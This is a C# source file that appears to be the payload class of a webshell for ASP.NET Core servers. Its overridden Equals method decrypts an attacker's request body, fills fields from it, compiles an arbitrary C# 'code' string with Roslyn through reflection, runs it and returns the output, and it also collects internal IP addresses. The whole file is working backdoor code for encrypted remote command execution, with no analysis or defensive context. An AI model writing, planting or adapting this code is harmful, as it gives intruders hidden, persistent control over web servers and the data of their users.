using System.Net;
using System.Net.Sockets;
using Microsoft.AspNetCore.Http;
using System.Reflection;
using System.Text;
using System.Security.Cryptography;

public class U
{
    public HttpRequest Request;
    public HttpResponse Response;
    public ISession Session;


    public string content;

    public string sessionId;


    private DefaultHttpContext context;

    private object current;

    public Dictionary<string, Object> globals = new Dictionary<string, Object>();

    public string error_msg;


    private object evalNode;


    public string code;


    public override bool Equals(object obj)
    {
        this.init(obj);
        Dictionary<string, string> dictionary = new Dictionary<string, string>();
        try
        {
            string text = this.eval();
            if (!text.Equals("true"))
            {
                throw new Exception(text);
            }
        }
        catch (Exception ex)
        {
            this.Response.WriteAsync(ex.Message);
        }

        return false;
    }


    public string eval()
    {
        var CodeAnalysis_CSharp = (Assembly)globals["Microsoft.CodeAnalysis.CSharp"];
        var CodeAnalysis = (Assembly)globals["Microsoft.CodeAnalysis"];


        var syntaxTreeType = CodeAnalysis_CSharp.GetType("Microsoft.CodeAnalysis.CSharp.CSharpSyntaxTree");

        var parseTextMethod = syntaxTreeType.GetMethods(BindingFlags.Public | BindingFlags.Static)
            .FirstOrDefault(m => m.Name == "ParseText" &&
                                 m.GetParameters().Length == 5 &&
                                 m.GetParameters()[0].ParameterType == typeof(string) &&
                                 m.GetParameters()[1].ParameterType ==
                                 CodeAnalysis_CSharp.GetType("Microsoft.CodeAnalysis.CSharp.CSharpParseOptions") &&
                                 m.GetParameters()[2].ParameterType == typeof(string) &&
                                 m.GetParameters()[3].ParameterType == typeof(Encoding) &&
                                 m.GetParameters()[4].ParameterType == typeof(CancellationToken));


        var syntaxTree = parseTextMethod.Invoke(null, new object[] { this.code, null, "", null, default });


        var appDomain = AppDomain.CurrentDomain;
        var assemblies = appDomain.GetAssemblies()
            .Where(a => !a.IsDynamic && !string.IsNullOrEmpty(a.Location))
            .Select(a => a.Location)
            .ToList();

        var metadataReferenceType = CodeAnalysis.GetType("Microsoft.CodeAnalysis.MetadataReference");

        var createFromFileMethod = metadataReferenceType.GetMethods(BindingFlags.Public | BindingFlags.Static)
            .FirstOrDefault(m => m.Name == "CreateFromFile" &&
                                 m.GetParameters().Length == 3);

        var references = assemblies
            .Select(location => createFromFileMethod.Invoke(null, new object[] { location, default, null }))
            .Cast<object>()
            .ToList();


        var compilationType = CodeAnalysis_CSharp.GetType("Microsoft.CodeAnalysis.CSharp.CSharpCompilation");
        var createMethod = compilationType.GetMethod("Create", BindingFlags.Public | BindingFlags.Static);
        var compilationOptionsType =
            CodeAnalysis_CSharp.GetType("Microsoft.CodeAnalysis.CSharp.CSharpCompilationOptions");
        var outputKindType = CodeAnalysis.GetType("Microsoft.CodeAnalysis.OutputKind");
        var outputKindField = outputKindType.GetField("DynamicallyLinkedLibrary");
        var dynamicallyLinkedLibraryValue = outputKindField.GetValue(null);


        var compilationOptions = compilationOptionsType.GetConstructors()
            .FirstOrDefault(c => c.GetParameters().Length == 27)
            .Invoke(new object[]
            {
                dynamicallyLinkedLibraryValue, false, null, null, null, null,
                CodeAnalysis.GetType("Microsoft.CodeAnalysis.OptimizationLevel").GetField("Debug").GetValue(null),
                false, false, null, null, default, null,
                CodeAnalysis.GetType("Microsoft.CodeAnalysis.Platform").GetField("AnyCpu").GetValue(null),
                CodeAnalysis.GetType("Microsoft.CodeAnalysis.ReportDiagnostic").GetField("Default").GetValue(null),
                CodeAnalysis.GetType("Microsoft.CodeAnalysis.Diagnostic")
                    .GetField("DefaultWarningLevel", BindingFlags.Static | BindingFlags.NonPublic).GetValue(null),
                null, true, false, null, null, null, null, null, false,
                CodeAnalysis.GetType("Microsoft.CodeAnalysis.MetadataImportOptions").GetField("Public").GetValue(null),
                CodeAnalysis.GetType("Microsoft.CodeAnalysis.NullableContextOptions").GetField("Disable")
                    .GetValue(null),
            });


        Type syntaxTreeListType = typeof(List<>).MakeGenericType(syntaxTreeType.BaseType);
        var syntaxTreeList = Activator.CreateInstance(syntaxTreeListType);
        syntaxTreeListType.GetMethod("Add").Invoke(syntaxTreeList, new object[] { syntaxTree });

        Type metadataReferenceListType = typeof(List<>).MakeGenericType(metadataReferenceType);
        var metadataReferenceList = Activator.CreateInstance(metadataReferenceListType);
        foreach (var reference in references)
        {
            metadataReferenceListType.GetMethod("Add").Invoke(metadataReferenceList, new object[] { reference });
        }


        var compilation = createMethod.Invoke(null, new object[]
        {
            "DynamicAssembly",
            syntaxTreeList,
            metadataReferenceList,
            compilationOptions
        });


        var emitMethod = compilationType.GetMethods().FirstOrDefault(c => c.GetParameters().Length == 11);
        using (var ms = new MemoryStream())
        {
            var result = emitMethod.Invoke(compilation,
                new object[] { ms, null, null, null, null, null, null, null, null, null, default(CancellationToken) });


            var resultType = result.GetType();
            var successProperty = resultType.GetProperty("Success");
            var success = (bool)successProperty.GetValue(result);

            if (!success)
            {
                var diagnosticsProperty = resultType.GetProperty("Diagnostics");
                var diagnostics = diagnosticsProperty.GetValue(result);
                int length = (int)diagnostics.GetType().GetProperty("Length")
                    .GetValue(diagnosticsProperty.GetValue(result));
                var errorMessages = new StringBuilder();
                for (int i = 0; i < length; i++)
                {
                    var itemProperty = diagnostics.GetType().GetProperty("Item", new Type[] { typeof(int) });
                    var item = itemProperty.GetValue(diagnostics, new object[] { i });
                    var location = item.GetType().GetMethod("get_Location").Invoke(item, null);
                    var lineSpan = location.GetType().GetMethod("GetLineSpan").Invoke(location, null);
                    var startLinePostitionProperty =
                        lineSpan.GetType().GetProperty("StartLinePosition").GetValue(lineSpan);
                    var linePproperty = startLinePostitionProperty.GetType().GetProperty("Line")
                        .GetValue(startLinePostitionProperty);
                    var rowPproperty = startLinePostitionProperty.GetType().GetProperty("Character")
                        .GetValue(startLinePostitionProperty);
                    var message =
                        item.GetType().GetMethod("ToString")
                            .Invoke(item,
                                null);

                    errorMessages.AppendLine($"Error: {message}");
                    errorMessages.AppendLine($"Line: {linePproperty}, Column: {rowPproperty}");
                }

                return errorMessages.ToString();
            }


            ms.Seek(0, SeekOrigin.Begin);
            var assembly = Assembly.Load(ms.ToArray());


            var type = assembly.GetType("Eval");
            var method = type.GetMethod("eval");
            var evalResult = method.Invoke(Activator.CreateInstance(type), null);

            return evalResult.ToString();
        }


        return " ";
    }


    private string getInnerIp()
    {
        string text = "";
        IPAddress[] hostAddresses = Dns.GetHostAddresses(Dns.GetHostName());
        foreach (IPAddress ipaddress in hostAddresses)
        {
            if (ipaddress.AddressFamily == AddressFamily.InterNetwork)
            {
                text = text + ipaddress.ToString() + " ";
            }
        }

        return text;
    }

    private byte[] EnjsonAndCrypt(Dictionary<string, string> result)
    {
        byte[] bytes = Encoding.UTF8.GetBytes(this.Dict2Json(result));
        return this.Encrypt(bytes);
    }

    private string Dict2Json(Dictionary<string, string> dict)
    {
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.Append("{");
        foreach (string text in dict.Keys)
        {
            stringBuilder.Append("\"" + text + "\":\"");
            stringBuilder.Append(dict[text] + "\",");
        }

        if (stringBuilder.ToString().EndsWith(","))
        {
            stringBuilder.Remove(stringBuilder.Length - 1, 1);
        }

        stringBuilder.Append("},");
        stringBuilder.Remove(stringBuilder.Length - 1, 1);
        return stringBuilder.ToString();
    }

    private byte[] Encrypt(byte[] data)
    {
        var EncryptFunc = ((DefaultHttpContext)current).Items["EncryptFunc"];
        MethodInfo method = (MethodInfo)EncryptFunc.GetType().GetProperty("Method").GetValue(EncryptFunc);


        byte[] array;
        if (method == null)
        {
            byte[] bytes = Encoding.Default.GetBytes(this.Session.Keys.ToArray().ToString());
            array = new RijndaelManaged().CreateEncryptor(bytes, bytes).TransformFinalBlock(data, 0, data.Length);
        }
        else
        {
            array = (byte[])method.Invoke(null, new object[] { data });
        }

        return array;
    }

    private byte[] Decrypt(byte[] data)
    {
        var DecryptFunc = ((DefaultHttpContext)current).Items["DecryptFunc"];
        MethodInfo method = (MethodInfo)DecryptFunc.GetType().GetProperty("Method").GetValue(DecryptFunc);

        byte[] result;
        if (method == null)
        {
            byte[] bytes = Encoding.Default.GetBytes(this.Session.Keys.ToArray().ToString());
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = bytes;
                aesAlg.IV = bytes;

                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
                result = decryptor.TransformFinalBlock(data, 0, data.Length);
            }
        }
        else
        {
            result = (byte[])method.Invoke(null, new object[] { data });
        }

        return result;
    }

    private void global()
    {
        Assembly[] assemblies = AppDomain.CurrentDomain.GetAssemblies();


        string targetAssemblyFullName = "Echo, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null";
        var targetAssembly =
            assemblies.FirstOrDefault(assembly => assembly.GetName().FullName.Equals(targetAssemblyFullName));

        if (targetAssembly != null)
        {
            string targetTypeName = "U";
            Type targetType = targetAssembly.GetType(targetTypeName);

            if (targetType != null)
            {
                object instance = Activator.CreateInstance(targetType);
                FieldInfo instancesField =
                    instance.GetType().GetField("globals", BindingFlags.Static | BindingFlags.Public);
                globals = instancesField.GetValue(null) as Dictionary<string, object>;
            }
        }
    }

    private void init(object obj)
    {
        /*
         * .net core中重构体系，所以HttpContext.Current不存在类似的
         */
        global();
        this.current = obj;
        this.fillRequestHandler(obj);
        this.fillParams();
        this.fillSessionHandler();
    }


    private void fillRequestHandler(object obj)
    {
        this.context = (DefaultHttpContext)obj;
        this.Response = this.context.Response;
        this.Request = this.context.Request;
        this.Response.ContentType = "charset=utf-8";
    }

    private void fillSessionHandler()
    {
        try
        {
            this.Session = ((HttpContext)this.context).Session;

            this.Session.Set("test", Encoding.UTF8.GetBytes("test"));

            if (!globals.ContainsKey(this.Session.Id))
            {
                if (globals != null)
                {
                    globals[this.Session.Id] = new Dictionary<string, object>();
                }
            }
        }
        catch (Exception ex)
        {
            if (this.sessionId != null)
            {
                if (!globals.ContainsKey(this.sessionId))
                {
                    if (globals != null)
                    {
                        globals[this.sessionId] = new Dictionary<string, object>();
                    }
                }
            }
            else
            {
                error_msg = ex.Message;
            }
        }
    }

    private void fillParams()
    {
        using (var memoryStream = new MemoryStream())
        {
            context.Request.Body.Seek(0, SeekOrigin.Begin);
            context.Request.Body.CopyTo(memoryStream);


            memoryStream.Seek(0, SeekOrigin.Begin);


            byte[] array = memoryStream.ToArray();


            array = Decrypt(array);


            Dictionary<string, string> extraData = getExtraData(array);


            if (extraData != null)
            {
                foreach (var key in extraData.Keys)
                {
                    var field = this.GetType().GetField(key);
                    if (field != null)
                    {
                        field.SetValue(this, extraData[key]);
                    }
                }
            }
        }
    }

    private Dictionary<string, string> getExtraData(byte[] fullData)
    {
        this.context.Request.Body.Seek(0, SeekOrigin.Begin);
        int num = this.IndexOf(fullData, new byte[]
        {
            126,
            126,
            126,
            126,
            126,
            126
        });
        byte[] bytes = new List<byte>(fullData).GetRange(num + 6, fullData.Length - num - 6).ToArray();
        string @string = Encoding.Default.GetString(bytes);
        Dictionary<string, string> dictionary = new Dictionary<string, string>();
        string[] array = @string.Split(new char[]
        {
            ','
        });
        foreach (string text in array)
        {
            string[] array3 = text.Split(new char[]
            {
                ':'
            });
            if (array3.Length == 2)
            {
                string key = array3[0];
                string string2 = Encoding.UTF8.GetString(Convert.FromBase64String(array3[1]));
                dictionary.Add(key, string2);
            }
        }

        return dictionary;
    }


    internal int IndexOf(byte[] srcBytes, byte[] searchBytes)
    {
        int num = 0;
        int result;
        if (srcBytes == null)
        {
            result = -1;
        }
        else if (searchBytes == null)
        {
            result = -1;
        }
        else if (srcBytes.Length == 0)
        {
            result = -1;
        }
        else if (searchBytes.Length == 0)
        {
            result = -1;
        }
        else if (srcBytes.Length < searchBytes.Length)
        {
            result = -1;
        }
        else
        {
            for (int i = 0; i < srcBytes.Length - searchBytes.Length; i++)
            {
                if (srcBytes[i] == searchBytes[0])
                {
                    if (searchBytes.Length == 1)
                    {
                        return i;
                    }

                    bool flag = true;
                    for (int j = 1; j < searchBytes.Length; j++)
                    {
                        if (srcBytes[i + j] != searchBytes[j])
                        {
                            flag = false;
                            break;
                        }
                    }

                    if (flag)
                    {
                        num++;
                        if (num == 2)
                        {
                            return i;
                        }
                    }
                }
            }

            result = -1;
        }

        return result;
    }

    private void fillRequest(object obj)
    {
        this.Response = this.context.Response;
        this.Request = this.context.Request;
        this.Response.ContentType = "charset=utf-8";
    }

    private void fillSession()
    {
        try
        {
            this.Session = this.context.Session;
        }
        catch (Exception)
        {
            if (!context.Items.ContainsKey(this.context.Session.Id) ||
                this.context.Items[this.context.Session.Id] == null)
            {
                this.context.Items[this.context.Session.Id] = new Dictionary<string, object>();
            }
        }
    }
}